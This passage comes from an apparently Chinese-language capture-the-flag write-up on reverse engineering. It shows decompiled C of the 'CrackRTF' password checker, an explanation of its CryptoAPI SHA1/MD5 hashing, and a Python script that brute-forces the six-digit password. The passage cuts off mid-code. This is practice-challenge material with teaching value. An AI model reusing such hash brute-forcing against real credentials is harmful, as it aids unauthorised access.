j</pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            x <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">if</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">==</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>运行得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404211317530.png" alt="image-20220404211317530" /></p>
<h2 id="crackrtf"><a class="anchor" href="#crackrtf">#</a> CrackRTF</h2>
<p>在互联网时代，兼容就是胜利，兼容就是王道。为了遏制微软一家独大的趋势，小明自诩民族斗士，向微软 CEO 挑战，CEO 给了他一个文件，据说破解后能得到一个微软的多信息文本格式文件。只有得到了才能获得挑战 CEO 的机会。小明绞尽脑汁，最后不得不求助大家。。。兄弟们该出手时就出手！ 注意：得到的 flag 请包上 flag {} 提交</p>
<p>peid 查壳，无壳且 32 位</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405210430528.png" alt="image-20220405210430528" /></p>
<p>ida 打开跟进主函数，f5 反编译</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  DWORD v3<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  DWORD v4<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">char</span> Str<span class="token punctuation">[</span><span class="token number">260</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-310h] BYREF</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+150h] [ebp-20Ch]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">char</span> String1<span class="token punctuation">[</span><span class="token number">260</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+154h] [ebp-208h] BYREF</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">char</span> Destination<span class="token punctuation">[</span><span class="token number">260</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+258h] [ebp-104h] BYREF</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token function">memset</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Destination<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token function">memset</span><span class="token punctuation">(</span>String1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>String1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the first passwd(1): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> Destination<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Destination<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">6</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Must be 6 characters!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  v7 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>Destination<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;</span> <span class="token number">100000</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token function">strcat</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> <span class="token string">"@DBApp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Destination<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token function">sub_40100A</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BYTE <span class="token operator">*</span><span class="token punctuation">)</span>Destination<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> String1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">_strcmpi</span><span class="token punctuation">(</span>String1<span class="token punctuation">,</span> <span class="token string">"6E32D0943418C2C33385BC35A1470250DD8923A9"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"continue...\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pls input the first passwd(2): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token function">memset</span><span class="token punctuation">(</span>Str<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> Str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">6</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Must be 6 characters!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>      <span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token function">strcat</span><span class="token punctuation">(</span>Str<span class="token punctuation">,</span> Destination<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token function">memset</span><span class="token punctuation">(</span>String1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>String1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>    v4 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token function">sub_401019</span><span class="token punctuation">(</span><span class="token punctuation">(</span>BYTE <span class="token operator">*</span><span class="token punctuation">)</span>Str<span class="token punctuation">,</span> v4<span class="token punctuation">,</span> String1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">_strcmpi</span><span class="token punctuation">(</span><span class="token string">"27019e688a4e62a649fd99cadaafdb4e"</span><span class="token punctuation">,</span> String1<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token function">sub_40100F</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>        <span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bye ~~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405210543364.png" alt="image-20220405210543364" /></p>
<p>可以看到，需要我们输入两次密码，而且每次输入密码都必须是 6 位数，否则退出</p>
<p>两次判断，第一次要求我们输入 <code>6</code>  位数，然后连接上 <code>@DBApp</code> ，通过一个 <code>sub_40100A函数</code> 进行加密，然后与 <code>6E32D0943418C2C33385BC35A1470250DD8923A9</code>  进行匹配，如果一样则继续往下走，否则退出</p>
<p>跟进 <code>sub_40100A函数</code></p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">sub_401230</span><span class="token punctuation">(</span>BYTE <span class="token operator">*</span>pbData<span class="token punctuation">,</span> DWORD dwDataLen<span class="token punctuation">,</span> LPSTR lpString1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  DWORD i<span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-28h]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  CHAR String2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+50h] [ebp-24h] BYREF</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  BYTE v6<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp-20h] BYREF</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  DWORD pdwDataLen<span class="token punctuation">;</span> <span class="token comment">// [esp+68h] [ebp-Ch] BYREF</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  HCRYPTHASH phHash<span class="token punctuation">;</span> <span class="token comment">// [esp+6Ch] [ebp-8h] BYREF</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  HCRYPTPROV phProv<span class="token punctuation">;</span> <span class="token comment">// [esp+70h] [ebp-4h] BYREF</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CryptAcquireContextA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">0xF0000000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptCreateHash</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0x8004u</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>phHash<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptHashData</span><span class="token punctuation">(</span>phHash<span class="token punctuation">,</span> pbData<span class="token punctuation">,</span> dwDataLen<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>      <span class="token function">CryptGetHashParam</span><span class="token punctuation">(</span>phHash<span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">,</span> v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pdwDataLen<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      <span class="token operator">*</span>lpString1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pdwDataLen<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token function">wsprintfA</span><span class="token punctuation">(</span>String2<span class="token punctuation">,</span> <span class="token string">"%02X"</span><span class="token punctuation">,</span> v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token function">lstrcatA</span><span class="token punctuation">(</span>lpString1<span class="token punctuation">,</span> String2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>      <span class="token function">CryptDestroyHash</span><span class="token punctuation">(</span>phHash<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>      <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">else</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>      <span class="token function">CryptDestroyHash</span><span class="token punctuation">(</span>phHash<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>      <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405210806097.png" alt="image-20220405210806097" /></p>
<p>利用 windows 加密的加密库函数，一般第二个参数是加密的方式，经过发现 <code>6E32D0943418C2C33385BC35A1470250DD8923A9</code>  是 <code>40</code>  位的加密后的字符串，很有可能是 <code>shal</code>  加密<br />
爆破脚本：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">"@DBApp"</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">,</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	s <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>flag</pre></td></tr><tr><td data-num="7"></td><td><pre>	x <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	cnt <span class="token operator">=</span> x<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">if</span> <span class="token string">"6e32d0943418c2c"</span> <span class="token keyword">in</span> cnt<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>		<span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405211133878.png" alt="image-20220405211133878" /></p>
<p>爆出第一次密码，运行 exe，输入检查</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405211246225.png" alt="image-20220405211246225" /></p>
<p>接下进行第二次输入，而第二次输入同理，不过他把 <code>123321@DBApp</code>  加在了第二次密码的后面，并且进行加密</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220405211349799.png" alt="image-20220405211349799" /></p>
<p>跟进 <code>sub_401019函数</code> 进行查看</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> __cdecl <span class="token function">sub_401040</span><span class="token punctuation">(</span>BYTE <span class="token operator">*</span>pbData<span class="token punctuation">,</span> DWORD dwDataLen<span class="token punctuation">,</span> LPSTR lpString1<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  DWORD i<span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-24h]</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  CHAR String2<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+50h] [ebp-20h] BYREF</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  BYTE v6<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+54h] [ebp-1Ch] BYREF</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  DWORD pdwDataLen<span class="token punctuation">;</span> <span class="token comment">// [esp+64h] [ebp-Ch] BYREF</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  HCRYPTHASH phHash<span class="token punctuation">;</span> <span class="token comment">// [esp+68h] [ebp-8h] BYREF</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  HCRYPTPROV phProv<span class="token punctuation">;</span> <span class="token comment">// [esp+6Ch] [ebp-4h] BYREF</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CryptAcquireContextA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">0xF0000000</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptCreateHash</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0x8003u</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>phHash<span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CryptHashData</span><span class="token punctuation">(</span>phHash<span class="token punctuation">,</span> pbData<span class="token punctuation">,</span> dwDataLen<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>      <span class="token function">CryptGetHashParam</span><span class="token punctuation">(</span>phHash<span class="token punctuation">,</span> <span class="token number">2u</span><span class="token punctuation">,</span> v6<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pdwDataLen<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      <span class="token operator">*</span>lpString1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>      <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pdwDataLen<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token function">wsprintfA</span><span class="token punctuation">(</span>String2<span class="token punctuation">,</span> <span class="token string">"%02X"</span><span class="token punctuation">,</span> v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token function">lstrcatA</span><span class="token punctuation">(</span>lpString1<span class="token punctuation">,</span> String2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>      <span class="token function">CryptDestroyHash</span><span class="token punctuation">(</span>phHash<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>      <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">else</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>      <span class="token function">CryptDestroyHash</span><span class="token punctuation">(</span>phHash<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>      <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token keyword">else</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token function">CryptReleaseContext</span><span class="token punctuation">(</span>phProv<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token 